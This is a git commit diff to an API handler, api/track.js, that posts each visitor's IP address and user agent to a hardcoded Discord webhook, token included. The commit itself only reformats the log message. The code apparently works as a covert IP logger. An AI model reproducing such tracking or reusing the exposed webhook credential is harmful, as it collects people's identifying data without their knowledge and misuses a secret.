eb82ec3372a2d2acde994bbcd00682219167fce2
cryxservices-glitch <cryxservices@gmail.com>
2026-05-15 01:50:23 -0400

    fix encoding

--- api/track.js
+++ api/track.js
@@ -6,7 +6,7 @@ module.exports = function handler(req, res) {
   
   const webhook = 'https://discord.com/api/webhooks/1464006669796118610/NtLug816A6N5psWgUjMrUBFe-yRtvmPvmIC8hMrbORLuDrxP4QnErus1K5XH2pKlqXi9';
   
-  const data = JSON.stringify({content: `📸 **View Logged**\nIP: \`${ip}\`\nUA: ${ua}`});
+  const data = JSON.stringify({content: `View Logged - IP: ${ip} - ${ua}`});
   
   try {
     const url = new URL(webhook);
